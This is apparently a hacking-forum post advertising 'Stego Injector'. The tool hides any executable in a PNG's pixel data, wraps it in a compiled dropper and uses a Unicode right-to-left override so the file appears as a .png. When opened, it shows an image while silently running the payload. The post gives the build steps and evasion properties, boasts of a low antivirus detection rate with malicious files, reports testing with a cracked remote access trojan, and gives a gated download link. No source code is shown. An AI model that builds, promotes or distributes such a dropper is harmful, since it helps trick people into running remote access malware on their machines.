
## 🧬 Stego Injector – Red Channel Steganography Dropper & Executable Cloaker

**Stego Injector** is a [Red Team tool](https://htdark.com/forums/hacking-tools.77/) that allows you to inject any **.exe** payload into a PNG image using red-channel steganography and export a final executable disguised as a `.png`. This PoC is ideal for education, awareness, and research in covert execution techniques.

![stego injector](https://i.postimg.cc/26NNzpXt/banner.png)

### 🎯 Features
- Hide any `.exe` inside a valid PNG image (stego PNG)
- Use XOR obfuscation on the red channel (1 byte per pixel)
- Embed the PNG into an automatic dropper stub
- Execute the payload and show the image seamlessly
- Compile the final `.exe` with custom icon and filename
- Camouflage the final `.exe` as a `.png` using Unicode RTLO
- Clean and silent – no dependencies once compiled

### 🧠 How it works
1. The selected `.exe` is encoded byte-by-byte into the **red channel** of a PNG image using `XOR 0x72` + inversion.
2. The modified image is saved as a valid stego PNG.
3. The stego PNG is then base64-encoded and injected into a `stub_loader.py` template.
4. The stub is compiled into a `.exe` using PyInstaller (with optional custom icon).
5. The resulting `.exe` is renamed using `U+202E` (RTLO) so it appears as `photo.png` even with extensions visible.
6. When executed, the file:
    - Extracts the PNG
    - Displays the image
    - Extracts and executes the original `.exe` payload silently

### 🧭 Execution Flow Diagram
![Stego-Injector-Diagram](https://i.postimg.cc/GhcGSHzB/Stego-Injector-Diagram.png)

### 📦 Output Example
```
Original files:
- innocent.png
- reverse_shell.exe

Final file:
- photo‮gnp.exe → (shown as photo.png)

Payload:
- Executes reverse_shell.exe
- Displays innocent.png to avoid suspicion
```

### 🛠️ Requirements Builder
- Python 3.7+
- PyInstaller
- Pillow

### 🛠️ Final File Requirements
- None

### 📸 GUI Screenshot
![Stego-Injector](https://i.postimg.cc/7Lc5HLgN/Stego-Injector.png)

### 📡 Scanner result
[https://htdark.com/scanner/report/ed40026eb0ac50ed6122ea46328b780f24761c24b05d97f146f665dae5badf2e](https://htdark.com/scanner/report/ed40026eb0ac50ed6122ea46328b780f24761c24b05d97f146f665dae5badf2e)

### 🧪 Detection notes
- The final `.exe` will be flagged by AVs if the payload is malicious.
- The current detection rate is very low despite testing with malicious files.
- This tool is designed for ethical use and simulation only.
- The PNG shown is fake – it only masks execution; the file is still a PE.

### 💻 Tested platforms
![windows 10](https://i.postimg.cc/RZYPBcbp/Windows-10.webp) ![windows 11](https://i.postimg.cc/7LTKYfFH/Windows11.webp)

### 🐀 Tested Rats
- [888 RAT v 1.2.6 Cracked](https://htdark.com/threads/888-rat-v-1-2-6-cracked.110635/)

### 🔍 Forensic Evasion
- File extension appears harmless: `.png`
- Valid PNG signature (but only visually; file starts with MZ)
- Payload hidden in pixel data – difficult to detect by casual inspection
- Does not drop to disk until runtime

### ⚠️ Disclaimer
> This tool is for **educational purposes only**. It is intended to demonstrate steganography and evasion techniques in Red Team scenarios, CTFs, and training labs.
>
> Do **not** use this tool on systems you don't own or without explicit authorization. The author assumes no responsibility for misuse.

### 🧠 Credits
Created by **@dEEpEst_23** for HTDark Community 💀  
Designed to blend payloads with pixels 🔍  
Stealth meets simplicity.

### ⬇️ Download
- The download is free!!
- Nothing is for sale!!
- It's free!!
- You must decrypt the password.
- Send me the decrypted password via private message.
- Maximum 2 attempts per user.
- The first person to decrypt the password gets it for free.

The code appears at the indicated time: 14:00 UTC  
```
In the image you could find the password to decipher.

 Clue: “The image holds information in the LSB of RGB components. Normalize it first. Then look at the parity.” 

Order used to encrypt the password → ROT13 → Base64 (x3) → AES(key= name domain forum) → DES(key= name old domain forum) → Vigenère (key= name creator tool Stego Injector)

 https://htdark.com/filecloud/download.php?id=p6d61rt2vz
Password: htdark.com
```

### 🔗 Source or Demo
Maybe Visit: [LvL23HT - Overview](https://github.com/LvL23HT)

### 🛠️ Related tools that may interest you
[Steganalyzer GUI - Detects hidden executables in PNG images (OSINT/Forensics Tool)](https://htdark.com/threads/steganalyzer-gui-detects-hidden-executables-in-png-images-osint-forensics-tool.132414/)  
[StegoCracker - Open Source and Free Steganography Tool](https://htdark.com/threads/stegocracker-open-source-and-free-steganography-tool.87543/)  
[https://htdark.com/blogs/post/next-gen-covert-channels-for-red-team.58/](https://htdark.com/blogs/post/next-gen-covert-channels-for-red-team.58/)
